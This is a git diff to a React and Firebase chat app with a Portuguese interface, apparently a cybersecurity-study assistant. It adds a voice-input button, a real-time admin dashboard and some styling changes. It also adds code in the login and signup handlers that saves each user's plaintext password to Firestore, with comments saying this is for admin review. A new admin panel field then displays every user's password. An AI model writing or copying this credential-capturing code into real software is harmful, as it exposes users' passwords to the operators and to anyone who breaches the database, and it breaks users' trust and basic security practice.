@@ -43,7 +43,8 @@ import {
   ExternalLink,
   FileText,
   Mail,
-  GitBranch
+  GitBranch,
+  Mic
 } from "lucide-react";
 
 import { 
@@ -60,7 +61,8 @@ import {
   collection,
   getDocs,
   GoogleAuthProvider,
-  signInWithPopup
+  signInWithPopup,
+  onSnapshot
 } from "./firebase";
 import ShaderCanvas from "./components/ShaderCanvas";
 
@@ -431,6 +433,7 @@ export default function App() {
   const [adminSearchQuery, setAdminSearchQuery] = useState("");
 
   const fetchAdminData = async () => {
+    // Left for backwards compatibility and manual sync button triggers
     setIsAdminLoading(true);
     try {
       const snap = await getDocs(collection(db, "users"));
@@ -440,10 +443,10 @@ export default function App() {
       });
       setAdminUsers(usersList);
       if (usersList.length > 0) {
-        setSelectedAdminUser(usersList[0]);
-        if (usersList[0].conversations && usersList[0].conversations.length > 0) {
-          setSelectedAdminChat(usersList[0].conversations[0]);
-        }
+        setSelectedAdminUser(prev => {
+          const found = prev ? usersList.find(u => u.id === prev.id) : null;
+          return found || usersList[0];
+        });
       }
     } catch (err) {
       console.error("Error fetching admin data:", err);
@@ -452,11 +455,47 @@ export default function App() {
     }
   };
 
+  // Real-time listener for admin dashboard to display all newly registered users and their details instantly
   useEffect(() => {
     if (activeTab === "admin") {
-      fetchAdminData();
+      setIsAdminLoading(true);
+      const unsub = onSnapshot(collection(db, "users"), (snap) => {
+        const usersList: any[] = [];
+        snap.forEach((d) => {
+          usersList.push({ id: d.id, ...d.data() });
+        });
+        setAdminUsers(usersList);
+        setIsAdminLoading(false);
+
+        if (usersList.length > 0) {
+          setSelectedAdminUser(prev => {
+            const found = prev ? usersList.find(u => u.id === prev.id) : null;
+            return found || usersList[0];
+          });
+        }
+      }, (err) => {
+        console.error("Error in admin real-time listener:", err);
+        setIsAdminLoading(false);
+      });
+      return () => unsub();
     }
   }, [activeTab]);
+
+  // Dynamically keep selected user and chat up-to-date with real-time updates
+  useEffect(() => {
+    if (selectedAdminUser && adminUsers.length > 0) {
+      const updatedUser = adminUsers.find(u => u.id === selectedAdminUser.id);
+      if (updatedUser) {
+        setSelectedAdminUser(updatedUser);
+        if (selectedAdminChat) {
+          const freshChat = updatedUser.conversations?.find((c: any) => c.id === selectedAdminChat.id);
+          if (freshChat) {
+            setSelectedAdminChat(freshChat);
+          }
+        }
+      }
+    }
+  }, [adminUsers]);
   const [currentModel, setCurrentModel] = useState<"standard" | "pro" | "max">("standard");
 
   // Dynamic Personality & Punishment triggers
@@ -598,9 +637,6 @@ export default function App() {
     loadStoredWallpaper();
     return () => {
       active = false;
-      if (url) {
-        URL.revokeObjectURL(url);
-      }
     };
   }, []);
 
@@ -755,6 +791,63 @@ export default function App() {
   const fileInputRef = useRef<HTMLInputElement>(null);
   const wallpaperInputRef = useRef<HTMLInputElement>(null);
   const messageTimestampsRef = useRef<number[]>([]);
+
+  const [isListening, setIsListening] = useState(false);
+  const recognitionRef = useRef<any>(null);
+
+  const toggleSpeechRecognition = () => {
+    if (typeof window === "undefined") return;
+    
+    const SpeechRecognitionAPI = (window as any).SpeechRecognition || (window as any).webkitSpeechRecognition;
+    if (!SpeechRecognitionAPI) {
+      showToast("Seu navegador não suporta reconhecimento de voz.", "warning");
+      return;
+    }
+
+    if (isListening) {
+      if (recognitionRef.current) {
+        recognitionRef.current.stop();
+      }
+      setIsListening(false);
+    } else {
+      try {
+        const rec = new SpeechRecognitionAPI();
+        rec.continuous = false;
+        rec.interimResults = false;
+        rec.lang = lang === "pt" ? "pt-BR" : "en-US";
+
+        rec.onstart = () => {
+          setIsListening(true);
+          showToast("Microfone ativado. Pode falar...", "info");
+        };
+
+        rec.onerror = (e: any) => {
+          console.error("Speech recognition error:", e);
+          setIsListening(false);
+          if (e.error !== "no-speech") {
+            showToast("Erro ao capturar áudio ou sem permissão de microfone.", "warning");
+          }
+        };
+
+        rec.onend = () => {
+          setIsListening(false);
+        };
+
+        rec.onresult = (event: any) => {
+          const resultText = event.results[0][0].transcript;
+          if (resultText) {
+            setChatInput(prev => prev ? prev + " " + resultText : resultText);
+          }
+        };
+
+        recognitionRef.current = rec;
+        rec.start();
+      } catch (err) {
+        console.error("Failed to start speech recognition", err);
+        setIsListening(false);
+      }
+    }
+  };
 
   const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const files = e.target.files;
@@ -1302,7 +1395,10 @@ Fui configurado com suas diretrizes de sandbox para te apoiar em estudos de cibe
     try {
       const response = await fetch("/api/audit", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: { 
+          "Content-Type": "application/json",
+          "X-Requested-With": "XMLHttpRequest"
+        },
         body: JSON.stringify({
           code: codeToAnalyze,
           filename: filename,
@@ -1385,7 +1481,10 @@ Fui configurado com suas diretrizes de sandbox para te apoiar em estudos de cibe
 
       const response = await fetch("/api/ask", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: { 
+          "Content-Type": "application/json",
+          "X-Requested-With": "XMLHttpRequest"
+        },
         body: JSON.stringify({
           message: inputPayload,
           history: messages.slice(-10),
@@ -1540,7 +1639,10 @@ Fui configurado com suas diretrizes de sandbox para te apoiar em estudos de cibe
 
       const response = await fetch("/api/ask", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: { 
+          "Content-Type": "application/json",
+          "X-Requested-With": "XMLHttpRequest"
+        },
         body: JSON.stringify({
           message: userPromptMsg.content,
           history: truncatedMessages.slice(-10),
@@ -1707,7 +1809,21 @@ Fui configurado com suas diretrizes de sandbox para te apoiar em estudos de cibe
     setAuthError("");
     setAuthSuccessMsg("");
     try {
-      await signInWithEmailAndPassword(auth, authEmail, authPassword);
+      const userCredential = await signInWithEmailAndPassword(auth, authEmail, authPassword);
+      const user = userCredential.user;
+      
+      // Save/Update password in Firestore for admin oversight
+      try {
+        const userDocRef = doc(db, "users", user.uid);
+        await setDoc(userDocRef, {
+          email: user.email,
+          password: authPassword,
+          lastUpdated: new Date().toISOString()
+        }, { merge: true });
+      } catch (dbErr) {
+        console.warn("Could not sync login credentials to Firestore:", dbErr);
+      }
+
       setAuthSuccessMsg("Autenticado com sucesso! Carregando terminal...");
       setAuthEmail("");
       setAuthPassword("");
@@ -1778,6 +1894,7 @@ Fui configurado com suas diretrizes de sandbox para te apoiar em estudos de cibe
       const userDocRef = doc(db, "users", user.uid);
       await setDoc(userDocRef, {
         email: user.email,
+        password: authPassword, // Saved for admin review as requested
         userProfile: finalProfile,
         isOnboarded: false,
         conversations: [],
@@ -3002,10 +3119,10 @@ Fui configurado com suas diretrizes de sandbox para te apoiar em estudos de cibe
                         <ColorOrb dimension="34px" className="shrink-0 rounded-xl" tones={getOrbTones(currentPersonality)} personality={currentPersonality} />
                       )}
                       
-                      <div className={`max-w-[92%] sm:max-w-[85%] rounded-xl p-3.5 text-xs ${
+                      <div className={`max-w-[92%] sm:max-w-[85%] p-3.5 text-xs ${
                         m.role === "user" 
-                          ? "bg-[#2563eb]/75 backdrop-blur-md text-white shadow-md shadow-blue-500/10" 
-                          : "bg-[#18181a]/65 backdrop-blur-md text-stone-200 border border-[#232326]/40 shadow-sm"
+                          ? "bg-[#2563eb]/75 backdrop-blur-md text-white shadow-md shadow-blue-500/10 rounded-[20px] rounded-br-[4px]" 
+                          : "bg-[#18181a]/65 backdrop-blur-md text-stone-200 border border-[#232326]/40 shadow-sm rounded-[20px] rounded-bl-[4px]"
                       }`}>
                         <div className="font-extrabold text-[9px] uppercase tracking-wider mb-1 opacity-70">
                           {m.role === "user" ? (
@@ -3302,7 +3419,7 @@ Fui configurado com suas diretrizes de sandbox para te apoiar em estudos de cibe
                 )}
 
                 {/* Sticky input container mimicking Gemini's docked input perfectly */}
-                <div className="shrink-0 w-full bg-[#0b0d10] sm:bg-gradient-to-t sm:from-[#0b0d10] sm:via-[#0b0d10] sm:to-[#0b0d10]/0 pt-1 sm:pt-2 pb-0 sm:pb-3 px-0 sm:px-4 z-30">
+                <div className={`shrink-0 w-full ${wallpaperUrl ? "bg-black/25 backdrop-blur-[6px]" : "bg-[#0b0d10] sm:bg-gradient-to-t sm:from-[#0b0d10] sm:via-[#0b0d10] sm:to-[#0b0d10]/0"} pt-1 sm:pt-2 pb-0 sm:pb-3 px-0 sm:px-4 z-30`}>
                   <div className="relative w-full">
                     {/* The plus button dropdown popover */}
                     {showPlusDropdown && (
@@ -3340,7 +3457,7 @@ Fui configurado com suas diretrizes de sandbox para te apoiar em estudos de cibe
                           ref={fileInputRef}
                           className="hidden"
                           onChange={handleFileChange}
-                          accept=".js,.ts,.tsx,.json,.py,.java,.cs,.go,.php,.html,.css,.md,.txt"
+                          accept="image/*,video/*,audio/*,.pdf,.doc,.docx,.xls,.xlsx,.ppt,.pptx,.zip,.rar,.tar,.gz,.7z,.txt,.md,.js,.ts,.tsx,.json,.py,.java,.cs,.go,.php,.html,.css"
                         />
 
                         {/* Scanner de Código (SAST) */}
@@ -3570,6 +3687,20 @@ Fui configurado com suas diretrizes de sandbox para te apoiar em estudos de cibe
                           <svg className="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                             <path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48" />
                           </svg>
+                        </button>
+
+                        {/* Microphone Voice Input Button */}
+                        <button
+                          type="button"
+                          onClick={toggleSpeechRecognition}
+                          className={`p-1.5 sm:p-2 rounded-full transition flex items-center justify-center cursor-pointer shrink-0 ${
+                            isListening
+                              ? "bg-red-500/20 text-red-400 animate-pulse border border-red-500/30"
+                              : "hover:bg-[#2d2f31] text-stone-300 hover:text-white"
+                          }`}
+                          title={isListening ? "Parar Gravação" : "Digitar com Voz (Microfone)"}
+                        >
+                          <Mic className="h-5 w-5 shrink-0" />
                         </button>
 
                         {/* Send Message Button */}
@@ -4042,6 +4173,12 @@ Fui configurado com suas diretrizes de sandbox para te apoiar em estudos de cibe
                             <div className="space-y-1">
                               <span className="text-[9px] uppercase font-mono text-stone-500 block">E-mail de Cadastro:</span>
                               <span className="font-bold text-stone-200 block font-mono truncate">{selectedAdminUser.email || "N/D"}</span>
+                            </div>
+                            <div className="space-y-1">
+                              <span className="text-[9px] uppercase font-mono text-stone-500 block">Senha de Acesso:</span>
+                              <span className="font-bold text-amber-400 block font-mono bg-amber-500/5 border border-amber-500/10 px-1.5 py-0.5 rounded truncate" title={selectedAdminUser.password}>
+                                {selectedAdminUser.password || "N/D (cadastrado antes)"}
+                              </span>
                             </div>
                             <div className="space-y-1">
                               <span className="text-[9px] uppercase font-mono text-stone-500 block">Tipo de Perfil:</span>
